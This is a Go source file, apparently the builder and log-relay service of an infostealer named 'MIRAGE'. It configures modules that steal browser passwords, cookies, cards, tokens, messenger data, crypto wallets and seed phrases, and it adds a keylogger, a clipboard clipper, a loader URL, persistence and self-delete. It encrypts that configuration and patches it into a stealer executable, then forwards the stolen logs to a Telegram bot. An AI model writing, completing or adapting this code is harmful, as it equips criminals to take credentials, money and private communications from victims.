package services

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"time"
)

const configSignature = "MIRAGECFG"

// ── Module toggles (Volta/Remus-style) ─────────────────────────

type ChromiumModules struct {
	Enabled      bool `json:"enabled"`
	Passwords    bool `json:"passwords"`
	Cookies      bool `json:"cookies"`
	Cards        bool `json:"cards"`
	History      bool `json:"history"`
	Autofill     bool `json:"autofill"`
	Bookmarks    bool `json:"bookmarks"`
	GoogleTokens bool `json:"google_tokens"`
	CdpGrab      bool `json:"cdp_grab"`
	RawExport    bool `json:"raw_export"`
	KillBrowsers bool `json:"kill_browsers"`
}

type FirefoxModules struct {
	Enabled   bool `json:"enabled"`
	Passwords bool `json:"passwords"`
	Cookies   bool `json:"cookies"`
	History   bool `json:"history"`
}

type MessengersModules struct {
	Discord         bool     `json:"discord"`
	Telegram        bool     `json:"telegram"`
	TelegramClients []string `json:"telegram_clients"`
	Signal          bool     `json:"signal"`
	WhatsApp        bool     `json:"whatsapp"`
	Skype           bool     `json:"skype"`
	Viber           bool     `json:"viber"`
	Element         bool     `json:"element"`
	Session         bool     `json:"session"`
	Tox             bool     `json:"tox"`
	ICQ             bool     `json:"icq"`
	Pidgin          bool     `json:"pidgin"`
	Outlook         bool     `json:"outlook"`
}

type SystemModules struct {
	SystemInfo   bool `json:"system_info"`
	WiFi         bool `json:"wifi"`
	Screenshot   bool `json:"screenshot"`
	Keylogger    bool `json:"keylogger"`
	SeedGrabber  bool `json:"seed_grabber"`
	Clipboard    bool `json:"clipboard"`
}

type ClipperModules struct {
	Enabled  bool     `json:"enabled"`
	Coins    []string `json:"coins"`
	BTCAddr  string   `json:"btc_addr"`
	ETHAddr  string   `json:"eth_addr"`
	TRXAddr  string   `json:"trx_addr"`
	XMRAddr  string   `json:"xmr_addr"`
	SOLAddr  string   `json:"sol_addr"`
	TONAddr  string   `json:"ton_addr"`
}

type GrabberModules struct {
	Enabled    bool     `json:"enabled"`
	Extensions []string `json:"extensions"`
	MaxSizeMB  int      `json:"max_size_mb"`
	MaxDepth   int      `json:"max_depth"`
	Paths      []string `json:"paths"`
}

type LoaderModules struct {
	Enabled bool   `json:"enabled"`
	URL     string `json:"url"`
}

type AntiDuplicateConfig struct {
	BanHWID     bool `json:"ban_hwid"`
	BanIP       bool `json:"ban_ip"`
	BanTimeoutH int  `json:"ban_timeout_h"`
}

type ProxyGateConfig struct {
	Enabled  bool   `json:"enabled"`
	Type     string `json:"type"`
	SourceID string `json:"source_id"`
}

type Modules struct {
	Chromium   ChromiumModules   `json:"chromium"`
	Firefox    FirefoxModules    `json:"firefox"`
	Wallets    bool              `json:"wallets"`
	Messengers MessengersModules `json:"messengers"`
	System     SystemModules     `json:"system"`
	Clipper    ClipperModules    `json:"clipper"`
	Grabber    GrabberModules    `json:"grabber"`
	Loader     LoaderModules     `json:"loader"`
	Gaming     bool              `json:"gaming"`
	Vpn        bool              `json:"vpn"`
	TwoFA      bool              `json:"twofa"`
	Passman    bool              `json:"passman"`
}

type BuildConfig struct {
	BuildName   string `json:"build_name"`
	BuildTag    string `json:"build_tag"`
	IconData    []byte `json:"icon_data,omitempty"`
	ManifestXML []byte `json:"manifest_xml,omitempty"`

	C2Host  string `json:"c2_host"`
	C2Port  int    `json:"c2_port"`
	C2Token string `json:"c2_token"`

	TelegramToken  string `json:"telegram_token"`
	TelegramChatID string `json:"telegram_chat_id"`

	AntiDuplicate AntiDuplicateConfig `json:"anti_duplicate"`
	ProxyGate     ProxyGateConfig     `json:"proxy_gate"`

	Modules         Modules `json:"modules"`
	Persistence     bool    `json:"persistence"`
	SelfDelete      bool    `json:"self_delete"`
	StartupDelayMS  int     `json:"startup_delay_ms"`
	Socks5Host      string  `json:"socks5_host"`
	Socks5Port      int     `json:"socks5_port"`
	IncludeDecryptor bool   `json:"include_decryptor"`
}

type BuildService struct{}

func NewBuildService() *BuildService {
	return &BuildService{}
}

func (s *BuildService) Build(stealerExe []byte, decryptorDll []byte, config BuildConfig) ([]byte, error) {
	sigIdx := bytes.Index(stealerExe, []byte(configSignature))
	if sigIdx < 0 {
		return nil, errors.New("MIRAGECFG signature not found")
	}

	jsonData, err := json.Marshal(config)
	if err != nil {
		return nil, fmt.Errorf("serialize config: %w", err)
	}

	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("generate key: %w", err)
	}
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		return nil, fmt.Errorf("generate nonce: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("create cipher: %w", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("create gcm: %w", err)
	}
	sealed := gcm.Seal(nil, nonce, jsonData, nil)
	// gcm.Seal returns ciphertext || tag (tag is last Overhead() bytes)
	// Zig decryptConfig expects: key(32) | nonce(12) | tag(16) | ciphertext(N)
	tagSize := gcm.Overhead()
	tag := sealed[len(sealed)-tagSize:]
	ciphertext := sealed[:len(sealed)-tagSize]

	payload := make([]byte, 0, 44+len(sealed))
	// Preserve the MIRAGECFG marker so Zig can find it at runtime
	payload = append(payload, []byte(configSignature)...)
	payload = append(payload, key...)
	payload = append(payload, nonce...)
	payload = append(payload, tag...)
	payload = append(payload, ciphertext...)

	result := make([]byte, len(stealerExe))
	copy(result, stealerExe)

	end := sigIdx + len(payload)
	if end > len(result) {
		return nil, errors.New("config too large for placeholder space")
	}
	copy(result[sigIdx:], payload)

	if len(decryptorDll) > 0 {
		result = append(result, decryptorDll...)
	}

	return result, nil
}

type TelegramProxy struct {
	client  *http.Client
	BaseURL string
}

func NewTelegramProxy() *TelegramProxy {
	return &TelegramProxy{
		client: &http.Client{
			Timeout: 30 * time.Second,
		},
		BaseURL: "https://api.telegram.org",
	}
}

func (p *TelegramProxy) SendLog(token, chatID string, data []byte, filename, caption string) error {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	if err := writer.WriteField("chat_id", chatID); err != nil {
		return fmt.Errorf("write chat_id field: %w", err)
	}
	if err := writer.WriteField("caption", caption); err != nil {
		return fmt.Errorf("write caption field: %w", err)
	}

	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return fmt.Errorf("create form file: %w", err)
	}
	if _, err := part.Write(data); err != nil {
		return fmt.Errorf("write file data: %w", err)
	}
	if err := writer.Close(); err != nil {
		return fmt.Errorf("close writer: %w", err)
	}

	url := fmt.Sprintf("%s/bot%s/sendDocument", p.BaseURL, token)

	var lastErr error
	for i := 0; i < 3; i++ {
		req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body.Bytes()))
		if err != nil {
			lastErr = fmt.Errorf("create request: %w", err)
			time.Sleep(time.Second)
			continue
		}
		req.Header.Set("Content-Type", writer.FormDataContentType())

		resp, err := p.client.Do(req)
		if err != nil {
			lastErr = fmt.Errorf("send request: %w", err)
			time.Sleep(time.Second)
			continue
		}

		if resp.StatusCode == http.StatusOK {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
			return nil
		}

		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		lastErr = fmt.Errorf("telegram API returned status %d", resp.StatusCode)
		time.Sleep(time.Second)
	}

	return lastErr
}

func (p *TelegramProxy) TestToken(token string) error {
	url := fmt.Sprintf("%s/bot%s/getMe", p.BaseURL, token)
	resp, err := p.client.Get(url)
	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API returned status %d: %s", resp.StatusCode, string(body))
	}

	var result struct {
		Ok bool `json:"ok"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return fmt.Errorf("parse response: %w", err)
	}
	if !result.Ok {
		return errors.New("telegram API returned ok=false")
	}

	return nil
}
